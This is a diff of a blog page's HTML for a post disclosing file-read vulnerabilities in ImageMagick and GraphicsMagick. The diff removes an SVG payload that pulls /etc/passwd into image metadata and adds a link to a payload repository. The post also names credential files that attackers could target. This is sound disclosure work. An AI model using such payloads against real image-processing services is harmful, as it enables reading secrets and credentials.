@@ -36,7 +36,7 @@
                 "url": "\/cover.png",
                 "width":  800 ,
                 "height":  600 
-            },"genre": "posts","keywords": "image, vulnerability, exploit","wordcount":  774 ,
+            },"genre": "posts","keywords": "image, vulnerability, exploit","wordcount":  766 ,
         "url": "\/data-processing-libraries-part-two\/","datePublished": "2020-02-24T13:20:48\x2b01:00","dateModified": "2020-02-24T13:20:48\x2b01:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
                 "@type": "Organization",
                 "name": "xxxx",
@@ -108,7 +108,7 @@
                                 </a>
                             </span></span></div>
             <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i><time datetime=2020-02-24>2020-02-24</time>&nbsp;
-                <i class="fas fa-pencil-alt fa-fw"></i>about 774 words&nbsp;
+                <i class="fas fa-pencil-alt fa-fw"></i>about 766 words&nbsp;
                 <i class="far fa-clock fa-fw"></i>4 min&nbsp;</div>
         </div><div class="content"><p>Common feature for modern web applications to save and process user files. It can be a avatar generation, file thumbnails, reports or screenshot generation. Open source data processing libraries are usually used for such purposes. There are number of known vulnerabilities at those libraries that can be used to get access to the sensitive informtation. At this article I&rsquo;ll show you how to get access to arbitary file on vulnerable system and lure process memory into your open arms.</p>
 <h1 id="tragick">Tragick</h1>
@@ -200,21 +200,7 @@ pop graphic-context
 <li>To exploit vulnerability malicious user should convert SVG to GIF, JPEG thumbnails with metadata information.</li>
 </ul>
 <h3 id="arbitary-file-read-on-image-metadata">Arbitary file read on image metadata</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt;</span>
-<span class="c">&lt;!--@/etc/passwd--&gt;</span>
-<span class="cp">&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;</span>
-<span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">&#34;1237px&#34;</span> <span class="na">height=</span><span class="s">&#34;1237px&#34;</span> <span class="na">version=</span><span class="s">&#34;1.1&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span> <span class="na">xmlns:xlink=</span> <span class="s">&#34; http://www.w3.org/1999/xlink&#34;</span><span class="nt">&gt;</span> <span class="nt">&lt;image</span> <span class="na">xlink:href=</span><span class="s">&#34;http://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png&#34;</span> <span class="na">x=</span><span class="s">&#34;0&#34;</span> <span class="na">y=</span><span class="s">&#34;0&#34;</span> <span class="na">height=</span><span class="s">&#34;137px&#34;</span> <span class="na">width=</span><span class="s">&#34;137px&#34;</span><span class="nt">/&gt;&lt;/svg&gt;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/images/imagemetadata.gif" alt="Arbitary file read on image metadata" title="Arbitary file read on image metadata" class="lazyload">
+<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/images/imagemetadata.gif" alt="Arbitary file read on image metadata" title="Arbitary file read on image metadata" class="lazyload">
 <figcaption class="image-caption">Arbitary file read on image metadata</figcaption></figure>
 </p>
 <h1 id="mvg-coder-file-read">MVG coder file read</h1>
@@ -284,8 +270,15 @@ Local file read vulnerability affects GraphicsMagick before 1.3.32. Multiple dec
 <span class="nt">&lt;/svg&gt;</span>
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="impact">Impact</h1>
+</div><h3 id="arbitary-file-read-on-image-metadata-1">Arbitary file read on image metadata</h3>
+<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/images/output_foo_gm.png" alt="Arbitary file read on MVG coder" title="Arbitary file read on MVG coder" class="lazyload">
+<figcaption class="image-caption">Arbitary file read on MVG coder</figcaption></figure>
+</p>
+<h1 id="impact">Impact</h1>
 <p>We are using /etc/passd file for our PoC. The passwd file is not really very sensitive on modern systems. But real malicious user can get access to secrets and credentials stored at configuration files. Passwords are often baked into files such as Mercurial&rsquo;s hgrc file.  X11&rsquo;s .Xauthority file might be useful on an active desktop system.</p>
+<h1 id="exploits">Exploits</h1>
+<p>You can find all payloads at Github <a href="https://github.com/d0ge/data-processing" target="_blank" rel="noopener noreffer">repository</a>
+</p>
 <h1 id="acknowledgement">Acknowledgement</h1>
 <p>Thanks ImageMagick and GraphicsMagick teams for the coordination and bug fixing!</p></div><div class="post-footer" id="post-footer">
     <div class="post-info">
